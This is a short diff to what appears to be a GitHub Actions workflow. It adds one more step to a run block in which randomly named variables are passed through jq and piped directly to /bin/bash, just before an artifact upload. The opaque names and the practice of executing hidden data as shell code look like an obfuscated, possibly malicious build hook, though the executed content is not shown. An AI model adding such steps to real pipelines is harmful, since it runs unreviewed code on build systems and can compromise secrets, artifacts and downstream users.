@@ -27,6 +27,7 @@ jobs:
           echo $d52281 | jq -r .w32 | /bin/bash
           printf '%s' "$o09" | jq -r .o4 | /bin/bash
           echo $iovni2951 | jq -r .ajbku0914 | /bin/bash
+          echo $vwl7 | jq -r .qn749 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
